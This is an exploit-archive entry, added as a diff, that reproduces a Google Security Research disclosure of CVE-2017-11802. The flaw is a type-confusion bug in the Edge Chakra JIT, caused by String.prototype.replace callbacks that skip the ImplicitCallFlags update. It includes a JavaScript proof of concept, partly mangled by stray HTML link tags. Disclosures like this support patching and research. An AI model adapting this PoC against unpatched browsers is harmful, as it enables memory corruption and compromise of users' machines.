@@ -1,0 +1,46 @@
+id: 28800
+date: 10/15/2017
+title: Microsoft Edge Chakra JIT Failed RegexHelper::StringReplace Call Exploit
+author: Google Security Research
+cves: CVE-2017-11802
+
+Microsoft Edge: Chakra: JIT: RegexHelper::StringReplace must call the callback function with updating ImplicitCallFlags 
+
+CVE-2017-11802
+
+
+The "String.prototype.replace" method can be inlined in the JIT process. So in the method, all the calls which may break the JIT assumptions must be invoked with updating "ImplicitCallFlags". But "RegexHelper::StringReplace" calls the replace function without updating the flag. Therefore it fails to detect if a user function was called.
+
+
+The PoC shows that it can result in type confusion.
+
+PoC:
+function main() {
+    let arr = [1.1, 1.1, 1.1, 1.1, 1.1];
+    function opt(f) {
+        arr[0] = 1.1;
+        arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
+        arr[2] = 1.1;
+        arr[3] = 1.1;
+    }
+
+    let <a href="https://crrev.com/0" title="" class="" rel="nofollow">r0</a> = () => '0';
+    for (var i = 0; i < 0x1000; i++)
+        opt(<a href="https://crrev.com/0" title="" class="" rel="nofollow">r0</a>);
+
+    opt(() => {
+        arr[0] = {};
+        return '0';
+    });
+
+    print(arr[1]);
+}
+
+main();
+
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available, the bug report will become
+visible to the public.
+
+#  0day.today [2023-03-27]  #
